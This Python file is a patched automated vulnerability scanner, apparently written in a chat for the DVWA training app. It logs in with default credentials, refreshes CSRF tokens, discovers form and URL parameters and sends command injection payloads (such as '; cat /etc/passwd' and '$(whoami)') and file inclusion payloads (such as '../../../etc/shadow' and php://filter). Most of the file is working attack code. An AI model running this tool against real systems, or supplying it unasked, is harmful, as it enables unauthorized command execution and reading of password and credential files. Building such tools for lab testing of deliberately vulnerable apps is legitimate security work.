#!/usr/bin/env python3
"""
auto_scanner.py -- PATCHED VERSION

WHAT WAS WRONG (see the diagnosis in chat for the full trace):
  1. extract_parameters() only read the URL's query string. DVWA's exec.php
     posts its 'ip' field via a POST <form> which never appears in the URL,
     so on a URL like ".../vulnerabilities/exec/" this always returned {}.
     That's the exact source of your "[!] No parameters found" output.
  2. There was no login/session handling anywhere. DVWA gates every
     vulnerable page behind login.php, so an unauthenticated request to a
     protected page gets redirected to the login form, which has no
     injectable parameters at all -- even if #1 were fixed, you'd still
     find nothing without a session.

WHAT THIS VERSION ADDS (same class name / constructor / output schema, so
pdf_report_generator.py and simple_main.py keep working with no changes
other than the new optional CLI flags in simple_main.py):
  - Auto-detects a login form on the target and logs in (DVWA defaults
    admin/password unless you pass --user/--pass), scraping DVWA's
    'user_token' CSRF field automatically so the login actually succeeds.
  - Discovers injection points from BOTH the URL query string AND parsed
    HTML <form> fields (GET or POST), instead of only the URL.
  - Runs a baseline (non-payload) request per parameter first, and only
    flags a payload as vulnerable if the indicator appears in the payload
    response but was NOT already present in the baseline -- this cuts down
    false positives from generic words like 'total' appearing on normal
    pages.
"""
import requests
from bs4 import BeautifulSoup
from typing import List, Dict, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlunparse
import json
from datetime import datetime
from requests.exceptions import RequestException, Timeout, ConnectionError
import warnings
warnings.filterwarnings('ignore')


class AutoVulnerabilityScanner:

    def __init__(self, target_url: str, timeout: int = 10, verbose: bool = True,
                 username: str = "admin", password: str = "password", auto_login: bool = True):
        self.target_url = target_url
        self.timeout = timeout
        self.verbose = verbose
        self.username = username
        self.password = password
        self.auto_login = auto_login
        self.session = requests.Session()
        self.session.verify = False
        self.vulnerabilities = []

        self.command_injection_payloads = [
            '; whoami', '| whoami', '`whoami`', '$(whoami)',
            '; id', '| id', '`id`', '$(id)',
            '; ls -la', '| ls -la', '; cat /etc/passwd', '| cat /etc/passwd',
            '`cat /etc/passwd`', '$(cat /etc/passwd)', '&& whoami', '|| whoami',
        ]

        self.lfi_payloads = [
            '../../../etc/passwd', '../../etc/passwd', '../etc/passwd',
            '....//....//....//etc/passwd', '../../../etc/passwd%00',
            '../../../etc/shadow', '../../../proc/self/environ',
            'php://filter/convert.base64-encode/resource=index.php',
            'php://input', '/etc/passwd', 'file:///etc/passwd',
        ]

        self.ci_indicators = [
            'root:x:', 'bin/bash', 'bin/sh', 'uid=', 'gid=', 'groups=', 'total', 'drwx',
        ]

        self.lfi_indicators = [
            'root:x:', 'bin/bash', 'bin/sh', 'nologin', '<?php', '<?=', 'USER=', 'PATH=', 'HOME=',
        ]

        self.scan_results = {
            'target': target_url,
            'timestamp': datetime.now().isoformat(),
            'scan_status': 'In Progress',
            'vulnerabilities': [],
            'scan_type': 'AUTOMATIC',
            'payloads_tested': {
                'command_injection': len(self.command_injection_payloads),
                'file_inclusion': len(self.lfi_payloads),
                'total_payloads': len(self.command_injection_payloads) + len(self.lfi_payloads)
            }
        }

    def log(self, message: str):
        if self.verbose:
            print(message)

    # ------------------------------------------------------------------
    # NEW: auto-login. DVWA (and many similar apps) redirect unauthenticated
    # requests to a login page. We detect that, log in, and keep the
    # session's cookies for every request after this.
    # ------------------------------------------------------------------
    def try_auto_login(self):
        if not self.auto_login:
            return

        try:
            r = self.session.get(self.target_url, timeout=self.timeout, verify=False)
        except (RequestException, Timeout, ConnectionError) as e:
            self.log(f"[!] Could not reach target to check login state: {e}")
            return

        looks_like_login = (
            "login" in r.url.lower()
            or BeautifulSoup(r.text, "html.parser").find("input", {"type": "password"}) is not None
        )
        if not looks_like_login:
            return  # no login required, nothing to do

        self.log(f"[AUTH] Target appears to require login (redirected to {r.url}) - attempting auto-login")

        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find("form")
        if not form:
            self.log("[!] Login page has no <form>; continuing unauthenticated")
            return

        login_action = urljoin(r.url, form.get("action") or r.url)
        fields = {}
        for inp in form.find_all("input"):
            name = inp.get("name")
            if not name:
                continue
            itype = (inp.get("type") or "text").lower()
            if itype == "password":
                fields[name] = self.password
            elif itype in ("submit",):
                fields[name] = inp.get("value", "Login")
            else:
                # covers username field and any hidden CSRF token (e.g. DVWA's user_token)
                default = inp.get("value", "")
                fields[name] = self.username if "user" in name.lower() and not default else default

        try:
            r2 = self.session.post(login_action, data=fields, timeout=self.timeout, verify=False)
        except (RequestException, Timeout, ConnectionError) as e:
            self.log(f"[!] Login POST failed: {e}")
            return

        still_login_page = "login" in r2.url.lower() and BeautifulSoup(
            r2.text, "html.parser").find("input", {"type": "password"}) is not None
        if still_login_page:
            self.log("[!] Auto-login did not appear to succeed (still see a login form). "
                     "Pass different --user/--pass if these credentials are wrong.")
        else:
            self.log(f"[AUTH] Logged in as '{self.username}'")

    # ------------------------------------------------------------------
    # REPLACED: extract_parameters() only looked at the URL query string.
    # extract_injection_points() also parses the actual page HTML for
    # <form> fields, which is what DVWA's exec.php needs (POST-only 'ip').
    # ------------------------------------------------------------------
    def extract_parameters(self, url: str) -> Dict[str, str]:
        """Kept for backward compatibility - URL query string only."""
        parsed = urlparse(url)
        params = {}
        if parsed.query:
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            for key, value_list in query_params.items():
                params[key] = value_list[0] if value_list else ''
        return params

    def extract_injection_points(self, url: str) -> List[Dict[str, Any]]:
        """Returns a list of {name, method, action_url, other_fields} -
        one entry per testable parameter, whether it lives in the URL
        query string or in a POST/GET <form> on the page."""
        points = []

        # GET params already in the URL. action_url must drop the query
        # string, otherwise requests' params= appends instead of replacing
        # it (e.g. "?page=include.php&page=PAYLOAD"), and most servers read
        # the FIRST occurrence -- silently ignoring the payload entirely.
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        base_no_query = urlunparse(parsed._replace(query=""))
        for name in qs:
            points.append({
                'name': name, 'method': 'GET', 'action_url': base_no_query,
                'other_fields': {k: v[0] for k, v in qs.items() if k != name}
            })

        try:
            r = self.session.get(url, timeout=self.timeout, verify=False)
        except (RequestException, Timeout, ConnectionError):
            return points

        soup = BeautifulSoup(r.text, "html.parser")
        for form in soup.find_all("form"):
            method = (form.get("method") or "GET").upper()
            action = urljoin(url, form.get("action") or url)
            inputs = form.find_all(["input", "textarea"])
            defaults = {i.get("name"): (i.get("value") or "") for i in inputs if i.get("name")}
            for name in defaults:
                if name.lower() in ("submit", "login"):
                    continue
                points.append({
                    'name': name, 'method': method, 'action_url': action,
                    'other_fields': {k: v for k, v in defaults.items() if k != name}
                })

        return points

    def _get_csrf_refresh(self, point: Dict) -> Dict[str, str]:
        """DVWA's forms carry a 'user_token' CSRF field that changes on
        every load - if we don't refresh it before each POST, the server
        rejects the request outright and we'd see 0 vulnerabilities again
        for reasons that have nothing to do with the payload itself."""
        try:
            r = self.session.get(point['action_url'], timeout=self.timeout, verify=False)
            soup = BeautifulSoup(r.text, "html.parser")
            token = soup.find("input", {"name": "user_token"})
            if token:
                return {"user_token": token.get("value", "")}
        except (RequestException, Timeout, ConnectionError):
            pass
        return {}

    def _send(self, point: Dict, payload: str):
        fields = dict(point['other_fields'])
        fields[point['name']] = payload
        fields.update(self._get_csrf_refresh(point))
        try:
            if point['method'] == 'POST':
                return self.session.post(point['action_url'], data=fields,
                                          timeout=self.timeout, verify=False)
            return self.session.get(point['action_url'], params=fields,
                                     timeout=self.timeout, verify=False)
        except (RequestException, Timeout, ConnectionError):
            return None

    def auto_scan_command_injection(self) -> List[Dict]:
        results = []
        points = self.extract_injection_points(self.target_url)
        if not points:
            self.log("[!] No parameters found")
            return results

        self.log(f"\n[AUTO] Found {len(points)} injection point(s): "
                  f"{[(p['name'], p['method']) for p in points]}")
        self.log(f"[AUTO] Testing {len(self.command_injection_payloads)} command injection payloads automatically...")

        for point in points:
            baseline = self._send(point, "test")
            baseline_text = baseline.text.lower() if baseline is not None else ""

            for payload in self.command_injection_payloads:
                response = self._send(point, payload)
                if response is None:
                    continue
                text = response.text.lower()
                # only flag indicators that are NEW in this response, not
                # already present on the baseline/normal page (cuts false
                # positives from generic words like 'total')
                vulnerable = any(ind in text and ind not in baseline_text for ind in self.ci_indicators)
                if vulnerable:
                    result = {
                        'type': 'Command Injection', 'severity': 'CRITICAL',
                        'url': point['action_url'], 'parameter': point['name'],
                        'method': point['method'], 'payload': payload,
                        'vulnerable': True, 'status_code': response.status_code,
                    }
                    results.append(result)
                    self.vulnerabilities.append(result)
                    self.log(f"[FOUND] CRITICAL - Command Injection on '{point['name']}' "
                              f"({point['method']}) with payload: {payload}")
                    break  # one confirmed hit per parameter is enough
        return results

    def auto_scan_file_inclusion(self) -> List[Dict]:
        results = []
        points = self.extract_injection_points(self.target_url)
        if not points:
            self.log("[!] No parameters found")
            return results

        self.log(f"\n[AUTO] Testing {len(self.lfi_payloads)} file inclusion payloads automatically...")

        for point in points:
            baseline = self._send(point, "test")
            baseline_text = baseline.text.lower() if baseline is not None else ""

            for payload in self.lfi_payloads:
                response = self._send(point, payload)
                if response is None:
                    continue
                text = response.text.lower()
                vulnerable = any(ind.lower() in text and ind.lower() not in baseline_text
                                  for ind in self.lfi_indicators)
                if vulnerable:
                    result = {
                        'type': 'File Inclusion (LFI)', 'severity': 'HIGH',
                        'url': point['action_url'], 'parameter': point['name'],
                        'method': point['method'], 'payload': payload,
                        'vulnerable': True, 'status_code': response.status_code,
                    }
                    results.append(result)
                    self.vulnerabilities.append(result)
                    self.log(f"[FOUND] HIGH - File Inclusion on '{point['name']}' "
                              f"({point['method']}) with payload: {payload}")
                    break
        return results

    def run_automatic_scan(self) -> Dict:
        print("\n" + "=" * 70)
        print("🔐 AUTOMATIC VULNERABILITY SCANNER")
        print("=" * 70)
        print(f"[+] Target: {self.target_url}")
        print(f"[+] Mode: FULLY AUTOMATIC")
        print(f"[+] Total payloads to test: {self.scan_results['payloads_tested']['total_payloads']}")
        print("=" * 70)

        self.try_auto_login()

        self.log("\n[*] PHASE 1: Command Injection Detection")
        print("-" * 70)
        ci_results = self.auto_scan_command_injection()

        self.log("\n\n[*] PHASE 2: File Inclusion Detection")
        print("-" * 70)
        lfi_results = self.auto_scan_file_inclusion()

        self.scan_results['vulnerabilities'] = self.vulnerabilities
        self.scan_results['summary'] = {
            'total_vulnerabilities': len(self.vulnerabilities),
            'critical_count': len([v for v in self.vulnerabilities if v.get('severity') == 'CRITICAL']),
            'high_count': len([v for v in self.vulnerabilities if v.get('severity') == 'HIGH']),
            'command_injection_found': len(ci_results),
            'file_inclusion_found': len(lfi_results),
        }
        self.scan_results['scan_status'] = 'Completed'

        print("\n" + "=" * 70)
        print("[+] SCAN COMPLETED")
        print("=" * 70)
        print(f"[+] Vulnerabilities Found: {self.scan_results['summary']['total_vulnerabilities']}")
        print(f"    ├─ CRITICAL: {self.scan_results['summary']['critical_count']}")
        print(f"    └─ HIGH: {self.scan_results['summary']['high_count']}")
        print(f"\n[+] Details:")
        print(f"    ├─ Command Injection: {self.scan_results['summary']['command_injection_found']}")
        print(f"    └─ File Inclusion: {self.scan_results['summary']['file_inclusion_found']}")
        print("=" * 70 + "\n")

        return self.scan_results
